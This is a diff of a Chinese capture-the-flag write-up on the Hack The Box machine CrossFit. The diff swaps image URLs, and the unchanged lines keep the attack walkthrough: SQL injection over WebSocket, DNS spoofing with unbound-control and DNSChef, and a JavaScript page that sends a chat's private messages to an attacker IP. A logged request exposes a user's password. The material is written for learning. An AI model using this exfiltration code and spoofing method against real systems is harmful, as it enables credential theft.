@@ -29,15 +29,15 @@ __
 
 有真实的ip，那上来首先肯定是端口扫描一波，看看开了哪些服务：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175808.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175808.png)
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175814.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175814.png)
 
 单从端口上看，突破点应该在web服务，unbound这个服务后续在详细介绍。
 
 在来一波目录扫描：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175815.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175815.png)
 
 发现一些登录页面，逐一尝试并没有取得突破。
 
@@ -47,7 +47,7 @@ __
     
     wfuzz -u http://10.10.10.232 -H “Host: FUZZ.crossfit.htb” -w /root/Desktop/domain.txt
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175817.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175817.png)
 
 发现了几个子域名，在etc/hosts文件里添加上：
 
@@ -59,7 +59,7 @@ __
 
 逐个点开观察，终于在burp里看到一个有意思的东西；
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175818.png)之前接触的少，查阅一波资料后，简单介绍如下：
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175818.png)之前接触的少，查阅一波资料后，简单介绍如下：
 
 ## WebSocket
 
@@ -76,7 +76,7 @@ __
 
 它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于服务器推送技术的一种。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175819.png)现在回到我们本次渗透；
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175819.png)现在回到我们本次渗透；
 
 > python3 -m websockets ws://gym.crossfit.htb/ws/
 
@@ -84,13 +84,13 @@ __
 
 > python3 -m websockets ws://10.10.10.232/ws/
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175820.png)实际测试这两个效果是一样的，任选一个都可以。看到这种json格式的数据，联想到的就是sql注入、命令执行、反序列化等。
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175820.png)实际测试这两个效果是一样的，任选一个都可以。看到这种json格式的数据，联想到的就是sql注入、命令执行、反序列化等。
 
 burp可以抓到websockets的包，（再次感叹神器的强大）
 
 ![]()还可以进行反复的修改；
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175821.png)最终测试出了参数params存在注入，上sqlmap试试，不行在自己写脚本。
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175821.png)最终测试出了参数params存在注入，上sqlmap试试，不行在自己写脚本。
 
 ## sqlmap中转注入
 
@@ -104,9 +104,9 @@ burp可以抓到websockets的包，（再次感叹神器的强大）
 
 无法成功。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175822.png)看下payload；（有助于加深理解）
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175822.png)看下payload；（有助于加深理解）
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175823.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175823.png)
 
 ![]()尝试多次都没有成功，后来详细研究了ws协议的传输过程，写了一个中转脚本；
 
@@ -128,9 +128,9 @@ burp可以抓到websockets的包，（再次感叹神器的强大）
 
 期间经过反复测试、修改，具体过程不在赘述，大家看脚本就明白了。运行结果截图：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175824.png)看下payload：
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175824.png)看下payload：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175825.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175825.png)
 
   *   *   *   *   *   *   *   *   * 
 
@@ -144,9 +144,9 @@ burp可以抓到websockets的包，（再次感叹神器的强大）
 
 ![]()
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175826.png)这里还可以读取文件，后面渗透需要用到；
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175826.png)这里还可以读取文件，后面渗透需要用到；
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175827.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175827.png)
 
   *   *   *   *   *   *   *   * 
 
@@ -205,7 +205,7 @@ unbound是一款相对简单的DNS服务软件，相对于bind9的复杂配置�
 
 Linux客户端测试。在客户端修改/etc/resolv.conf文件,将DNS服务器的IP地址指向上述所配置的授权DNS服务器的IP地址。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175828.png)使用nslookup命令验证DNS查询结果
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175828.png)使用nslookup命令验证DNS查询结果
 
 ![]()
 
@@ -231,9 +231,9 @@ Linux客户端测试。在客户端修改/etc/resolv.conf文件,将DNS服务器�
 
 之前下载的unbound的配置文件unbound.conf如下：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175829.png)修改为自己的路径：
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175829.png)修改为自己的路径：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175830.png)在kali的apache2网页目录下写入如下2个文件：
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175830.png)在kali的apache2网页目录下写入如下2个文件：
 
   * 
 
@@ -249,7 +249,7 @@ Linux客户端测试。在客户端修改/etc/resolv.conf文件,将DNS服务器�
     
     echo "<html><head><script src=\"http://crossfit-club.htb/socket.io/socket.io.js\"></script><script>var s = io.connect(\"http://crossfit-club.htb\");s.emit(\"user_join\", { username : \"Admin\" });s.on(\"private_recv\", (d) => {var xhr = new XMLHttpRequest();xhr.open(\"GET\", \"http://10.10.16.9/get.php?s=\" + btoa(JSON.stringify(d)), true);xhr.send();});</script></head><body><p>Getting data ...</p></body></html>" > /var/www/html/go.html
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175831.png)开启apache2服务；
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175831.png)开启apache2服务；
 
   * 
 
@@ -279,7 +279,7 @@ unbound-control的基本命令格式：
     
     unbound-control -c ./unbound.conf -s 10.10.10.232@8953 forward_add +i xemployees.crossfit.htb. 10.10.16.14@53; sleep 2;unbound-control -c ./unbound.conf -s 10.10.10.232@8953 forward_add +i xcrossfit.htb. 10.10.16.14@53
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175833.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175833.png)
 
 在hosts里把这两个域名也加上；
 
@@ -308,7 +308,7 @@ window修改dns服务器：
 
 fackip欺骗到指定的ip，facedomains欺骗域名
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175834.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175834.png)
 
 成功实现了DNS欺骗。
 
@@ -318,7 +318,7 @@ fackip欺骗到指定的ip，facedomains欺骗域名
 > —fakeip 127.0.0.1 —count 2; sleep 1; python3 dnschef.py -i 10.10.16.14
 > —fakedomains xcrossfit.htb,xemployees.crossfit.htb —fakeip 10.10.16.14
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175835.png)这里渗透的思路就是：既然我们获取了目标服务器的DNS配置文件，那我们就利用unbound搭建一个DNS服务器，配置与目标服务器相同。在利用DNSChef工具来进行DNS欺骗，将受害机器的DNS流量全部引导到我们自己搭建的DNS服务器上，实现了流量的劫持，并可以对关键数据进行拦截与分析，引导受害机器运行我们定义的恶意代码。
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175835.png)这里渗透的思路就是：既然我们获取了目标服务器的DNS配置文件，那我们就利用unbound搭建一个DNS服务器，配置与目标服务器相同。在利用DNSChef工具来进行DNS欺骗，将受害机器的DNS流量全部引导到我们自己搭建的DNS服务器上，实现了流量的劫持，并可以对关键数据进行拦截与分析，引导受害机器运行我们定义的恶意代码。
 
 ## 获取用户密码
 
@@ -340,11 +340,11 @@ fackip欺骗到指定的ip，facedomains欺骗域名
     
     10.10.10.232 - - [19/Jul/2021:21:03:31 -0400] "GET /get.php?s=eyJzZW5kZXJfaWQiOjIsImNvbnRlbnQiOiJIZWxsbyBEYXZpZCwgSSd2ZSBhZGRlZCBhIHVzZXIgYWNjb3VudCBmb3IgeW91IHdpdGggdGhlIHBhc3N3b3JkIGBOV0JGY1NlM3dzNFZEaFRCYC4iLCJyb29tSWQiOjIsIl9pZCI6MjcxOX0= HTTP/1.1" 404 489 "http://xcrossfit.htb/go.html" "Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0"
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175836.png)对这段base64解码后可得：
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175836.png)对这段base64解码后可得：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175837.png)获取了用户的密码，然后ssh登录：
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175837.png)获取了用户的密码，然后ssh登录：
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175838.png)至此，本次渗透就暂告一段落了，后续的提权渗透主要是利用suid方法进行，不是本篇文章的主题，网上各种例子也很多，这里就不在赘述。
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175838.png)至此，本次渗透就暂告一段落了，后续的提权渗透主要是利用suid方法进行，不是本篇文章的主题，网上各种例子也很多，这里就不在赘述。
 
 ## 后记
 
@@ -358,14 +358,14 @@ fackip欺骗到指定的ip，facedomains欺骗域名
 
 在本次渗透实战中，如果没有SQL注入漏洞，就无法获取DNS服务器的配置文件，自然也就无法实现DNS欺骗，但核心还是对用户输入数据的合法性没有判断，导致SQL注入漏洞的存在，与websocket协议没有直接的关系，本文只是提供了一种基于websocket协议进行SQL注入的方法，并在此基础上实现了DNS欺骗，渗透思路有亮点，记录下来与大家共同学习。
 
-![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175839.png)
+![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175839.png)
 
 作者：windcctv，文章来源：FreeBuf
 
  **推荐阅读**[
-**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175840.png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247497658&idx=1&sn=87d6b678c3dab4baeeb28ca81276d333&chksm=9acd2725adbaae334bd016bf907ed651a1b1529279a04cb45aad101025d2f09a4637e8810072&scene=21#wechat_redirect)  
+**![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175840.png)**](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247497658&idx=1&sn=87d6b678c3dab4baeeb28ca81276d333&chksm=9acd2725adbaae334bd016bf907ed651a1b1529279a04cb45aad101025d2f09a4637e8810072&scene=21#wechat_redirect)  
  **觉得不错点个 **“赞”** 、“在看”，支持下小编**
-**![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175841.png)**
+**![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20210811175841.png)**
 
 预览时标签不可点
 
